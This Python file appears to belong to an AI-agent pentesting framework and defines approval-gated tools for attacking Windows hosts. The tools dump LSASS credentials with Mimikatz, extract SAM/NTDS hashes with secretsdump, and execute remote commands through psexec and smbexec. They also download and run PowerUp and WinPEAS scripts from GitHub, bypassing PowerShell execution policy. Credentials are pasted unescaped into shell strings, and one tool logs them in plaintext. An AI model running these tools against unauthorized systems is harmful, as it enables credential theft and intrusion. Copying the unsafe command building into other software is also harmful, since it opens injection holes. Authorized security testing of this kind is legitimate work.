import logging
from typing import Any

from clearwing.agent.tooling import tool
from clearwing.agent.tools.ops.pentest_container import KALI, PARROT

logger = logging.getLogger(__name__)


@tool(requires_approval=True)
def run_mimikatz(
    target: str,
    creds: str | None = None,
    session: str | None = None,
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Run Mimikatz (sekurlsa::logonpasswords) via remote Metasploit/impacket.

    Mimikatz dumps plaintext credentials from LSASS memory on a Windows host.
    It is executed through impacket-psexec or a pre-established
    Metasploit Meterpreter session.

    Args:
        target: Windows IP/hostname to target.
        creds: IMPACKET credentials in DOMAIN/user:password format.
        session: Existing Metasploit session ID (overrides creds if present).
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    mgr = KALI if distro == "kali" else PARROT

    if session:
        cmd = f"msfconsole -q -x 'sessions -i {session}; run post/windows/gather/credentials/mimikatz; exit'"
        logger.info("Running Mimikatz through Meterpreter session %s", session)
    elif creds:
        domain, user_pass = creds.split("/", 1)
        user, password = user_pass.split(":", 1)
        cmd = (
            f"psexec.py '{domain}/{user}:{password}@{target}' "
            "-c /usr/share/mimikatz/x64/mimikatz.exe "
            "'sekurlsa::logonpasswords exit'"
        )
        logger.info("Uploading Mimikatz via impacket-psexec: %s", cmd)
    else:
        return {
            "exit_code": -1,
            "output": "",
            "error": "Either creds or session must be provided for Mimikatz.",
        }

    return mgr.execute(container_id, cmd, requires_approval=True)


@tool(requires_approval=True)
def run_powerup(
    target: str,
    creds: str | None = None,
    session: str | None = None,
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Run PowerUp.ps1 on a remote Windows host to find privilege-escalation
    vectors.

    Args:
        target: Windows IP/hostname.
        creds: IMPACKET credentials in DOMAIN/user:password format.
        session: Existing Metasploit session ID (overrides creds).
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    mgr = KALI if distro == "kali" else PARROT

    if session:
        cmd = (
            f"msfconsole -q -x 'sessions -i {session}; "
            "upload /usr/share/powersploit/Privesc/PowerUp.ps1 C:\\\\temp; "
            "execute -f powershell -a \"-ExecutionPolicy Bypass -File C:\\\\temp\\\\PowerUp.ps1 | Out-File C:\\\\temp\\\\powerup.txt\"; "
            "download C:\\\\temp\\\\powerup.txt /tmp/powerup.txt; exit'"
        )
    elif creds:
        domain, user_pass = creds.split("/", 1)
        user, password = user_pass.split(":", 1)
        ps = (
            "IEX (New-Object Net.WebClient).DownloadString("
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); "
            "Invoke-AllChecks | Out-File C:\\\\temp\\\\powerup.txt"
        )
        cmd = (
            f"psexec.py '{domain}/{user}:{password}@{target}' "
            f"powershell.exe -ExecutionPolicy Bypass -Command \"{ps}\""
        )
    else:
        return {
            "exit_code": -1,
            "output": "",
            "error": "Either creds or session must be provided for PowerUp.",
        }

    logger.info("Running PowerUp on %s", target)
    return mgr.execute(container_id, cmd, requires_approval=True)


@tool(requires_approval=True)
def run_winpeas(
    target: str,
    creds: str | None = None,
    session: str | None = None,
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Run WinPEAS on a remote Windows host for privilege-escalation enumeration.

    Args:
        target: Windows IP/hostname.
        creds: IMPACKET credentials in DOMAIN/user:password format.
        session: Existing Metasploit session ID (overrides creds).
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    mgr = KALI if distro == "kali" else PARROT
    winpeas_url = (
        "https://raw.githubusercontent.com/carlospolop/PEASS-ng/"
        "master/winPEAS/winPEASps1/winPEAS.ps1"
    )

    if session:
        cmd = (
            f"msfconsole -q -x 'sessions -i {session}; "
            f"execute -f powershell -a \"-c IEX (New-Object Net.WebClient)."
            f"DownloadString(\\x27{winpeas_url}\\x27); Invoke-WinPeas\"; exit'"
        )
    elif creds:
        domain, user_pass = creds.split("/", 1)
        user, password = user_pass.split(":", 1)
        ps = (
            f"IEX (New-Object Net.WebClient).DownloadString('{winpeas_url}'); "
            "Invoke-WinPeas"
        )
        cmd = (
            f"psexec.py '{domain}/{user}:{password}@{target}' "
            f"powershell.exe -ExecutionPolicy Bypass -Command \"{ps}\""
        )
    else:
        return {
            "exit_code": -1,
            "output": "",
            "error": "Either creds or session must be provided for WinPEAS.",
        }

    logger.info("Running WinPEAS on %s", target)
    return mgr.execute(container_id, cmd, requires_approval=True)


@tool(requires_approval=True)
def run_secretsdump(
    target: str,
    creds: str,
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Use impacket-secretsdump to extract SAM/NTDS hashes remotely.

    Args:
        target: Windows IP/hostname.
        creds: IMPACKET credentials in DOMAIN/user:password format.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    mgr = KALI if distro == "kali" else PARROT
    cmd = f"secretsdump.py '{creds}@{target}'"
    logger.info("Running secretsdump against %s", target)
    return mgr.execute(container_id, cmd, requires_approval=True)


@tool(requires_approval=True)
def run_psexec(
    target: str,
    creds: str,
    command: str = "cmd.exe /c whoami",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Execute a command via impacket-psexec on a remote Windows host.

    Args:
        target: Windows IP/hostname.
        creds: IMPACKET credentials in DOMAIN/user:password format.
        command: Command to execute (default: whoami).
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    mgr = KALI if distro == "kali" else PARROT
    cmd = f"psexec.py '{creds}@{target}' '{command}'"
    logger.info("Running psexec on %s: %s", target, cmd)
    return mgr.execute(container_id, cmd, requires_approval=True)


@tool(requires_approval=True)
def run_smbexec(
    target: str,
    creds: str,
    command: str = "whoami",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Execute a command via impacket-smbexec on a remote Windows host.

    Args:
        target: Windows IP/hostname.
        creds: IMPACKET credentials in DOMAIN/user:password format.
        command: Command to execute (default: whoami).
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    mgr = KALI if distro == "kali" else PARROT
    cmd = f"smbexec.py '{creds}@{target}' '{command}'"
    logger.info("Running smbexec on %s: %s", target, cmd)
    return mgr.execute(container_id, cmd, requires_approval=True)